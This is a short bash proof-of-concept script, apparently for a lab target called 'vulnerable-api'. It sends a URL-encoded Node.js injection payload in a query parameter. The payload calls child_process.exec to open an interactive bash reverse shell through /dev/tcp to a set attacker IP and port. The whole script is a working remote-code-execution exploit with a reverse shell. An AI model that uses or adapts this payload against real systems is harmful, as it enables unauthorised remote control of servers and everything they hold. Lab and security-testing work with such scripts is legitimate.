#!/bin/bash

BASE_URL="http://127.0.0.1:9000/vulnerable-api"

ATTACKER_IP="172.17.0.1"
ATTACKER_PORT="9090"

echo -e "${CYAN}info${RESET}: vulnerable app url ( ${GREEN}${BASE_URL}${RESET} )"
echo -e "${CYAN}info${RESET}: sending payload ...\n"

curl "${BASE_URL}/?q=require(%27child_process%27).exec(%27bash+-c+%22bash+-i+%3E%26+/dev/tcp/${ATTACKER_IP}/${ATTACKER_PORT}+0%3E%261%22%27)"
